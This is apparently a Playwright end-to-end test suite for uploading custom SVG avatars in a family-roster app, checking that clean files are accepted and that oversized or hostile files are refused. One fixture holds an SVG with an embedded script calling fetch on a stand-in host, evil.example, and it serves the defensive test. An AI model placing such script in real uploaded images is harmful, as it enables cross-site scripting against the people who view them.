import { newAnonymousContext } from '@e2e/utils/context';
import { expect, test } from '@e2e/fixtures/family';
import { withDb } from '@e2e/utils/seed';

/**
 * Custom avatars, end to end (M20).
 *
 * The unit suite proves what the validator answers and the integration suite
 * proves the Server Action honours it. Neither can show the thing this feature
 * is actually for: a parent picking a file in the roster dialog and their
 * child's face changing on the card. That needs a browser, and so does the
 * refusal — the picker has to say *why* a file will not do, in the dialog,
 * before anything is submitted.
 */

const CLEAN_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#D0C6AC"/><circle cx="38" cy="45" r="6" fill="#1f2937"/><circle cx="62" cy="45" r="6" fill="#1f2937"/></svg>`;

/** Comfortably past the 20 KB cap, and otherwise perfectly valid markup. */
const OVERSIZED_SVG = `<svg xmlns="http://www.w3.org/2000/svg"><desc>${'a'.repeat(25 * 1024)}</desc></svg>`;

/** Valid XML, and exactly what the allowlist exists to refuse. */
const HOSTILE_SVG = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//evil.example')</script></svg>`;

const svgFile = (name: string, markup: string) => ({
  name,
  mimeType: 'image/svg+xml',
  buffer: Buffer.from(markup, 'utf8'),
});

test.describe('custom avatar upload', () => {
  test('a parent uploads their own SVG and it becomes the member’s face', async ({ page }) => {
    const displayName = `Uploader ${Date.now()}`;

    await page.goto('/nl/family');
    await page.getByRole('button', { name: 'Gezinslid toevoegen' }).click();

    const dialog = page.getByRole('dialog');
    await dialog.getByLabel('Naam').fill(displayName);
    await dialog.getByTestId('avatar-upload-input').setInputFiles(svgFile('face.svg', CLEAN_SVG));

    // The preview is the picker's own answer: the file was read, validated in
    // the browser, and is now the value the hidden field carries.
    const preview = dialog.getByTestId('avatar-upload-preview');
    await expect(preview).toBeVisible();
    await expect(preview).toHaveAttribute('src', /^data:image\/svg\+xml;base64,/);

    await dialog.getByTestId('save-member').click();
    await expect(dialog).toBeHidden();

    // …and the server agreed: the roster renders the stored data URI, through
    // `<img src>` and never as inline markup.
    const row = page.getByTestId('member-row').filter({ hasText: displayName });
    await expect(row.locator('img')).toHaveAttribute('src', /^data:image\/svg\+xml;base64,/);
  });

  test('refuses an oversized or hostile file, in the dialog, before saving', async ({ page }) => {
    await page.goto('/nl/family');
    await page.getByRole('button', { name: 'Gezinslid toevoegen' }).click();

    const dialog = page.getByRole('dialog');
    const input = dialog.getByTestId('avatar-upload-input');
    const error = dialog.getByTestId('avatar-upload-error');

    await input.setInputFiles(svgFile('huge.svg', OVERSIZED_SVG));
    await expect(error).toBeVisible();
    await expect(error).toHaveText(/te groot/i);
    await expect(dialog.getByTestId('avatar-upload-preview')).toHaveCount(0);

    await input.setInputFiles(svgFile('hostile.svg', HOSTILE_SVG));
    await expect(error).toBeVisible();
    await expect(error).toHaveText(/werkt niet als avatar/i);
    await expect(dialog.getByTestId('avatar-upload-preview')).toHaveCount(0);

    // A preset still works after a refusal — the failed upload left no state
    // behind for the rest of the picker to trip over.
    await dialog.getByRole('button', { name: 'Vos' }).click();
    await expect(dialog.getByRole('button', { name: 'Vos' })).toHaveAttribute(
      'aria-pressed',
      'true'
    );
  });

  /**
   * The same capability on the invite flow's profile step, which is not the
   * roster's picker but a grid of self-submitting one-tap forms (FR26). The
   * upload has to keep that shape: choosing the file *is* the interaction, so
   * the form submits itself and the invitee lands on step three — no extra
   * confirm button, and still nothing typed.
   */
  test('the invited parent can upload their own face in one interaction', async ({
    page,
    browser,
    family,
  }) => {
    const displayName = `Papa ${Date.now()}`;

    await page.goto('/nl/family');
    await page.getByRole('button', { name: 'Gezinslid toevoegen' }).click();

    const dialog = page.getByRole('dialog');
    await dialog.getByLabel('Naam').fill(displayName);
    await dialog.getByRole('combobox').first().click();
    await page.getByRole('option', { name: 'Volwassene' }).click();
    await dialog.getByTestId('save-member').click();
    await expect(dialog).toBeHidden();

    await page.getByTestId('member-invite-open').click();
    await page.getByTestId('member-invite-email').fill(`papa-${Date.now()}@kynite.test`);
    await page.getByTestId('member-invite-send').click();
    const inviteUrl = (await page.getByTestId('member-invite-url').inputValue()).trim();

    // A browser that has never met this application, as the invite specs insist.
    const context = await newAnonymousContext(browser);
    const invitee = await context.newPage();

    try {
      await invitee.goto(inviteUrl);
      await invitee.getByRole('button', { name: 'Doe mee' }).click();
      await expect(invitee.getByTestId('invite-profile')).toBeVisible();

      await invitee
        .getByTestId('invite-profile-upload-input')
        .setInputFiles(svgFile('papa.svg', CLEAN_SVG));

      // Choosing the file submitted the step: the next screen is Google's.
      await expect(invitee.getByTestId('invite-google')).toBeVisible();

      const stored = await withDb(async (client) => {
        const { rows } = await client.query<{ avatar_url: string | null }>(
          'select avatar_url from member where family_id = $1 and display_name = $2',
          [family.familyId, displayName]
        );
        return rows[0]?.avatar_url ?? null;
      });

      // The data URI reached the column through the real action — the tile did
      // not just look right on the way past.
      expect(stored).toMatch(/^data:image\/svg\+xml;base64,/);
    } finally {
      await context.close();
    }
  });
});
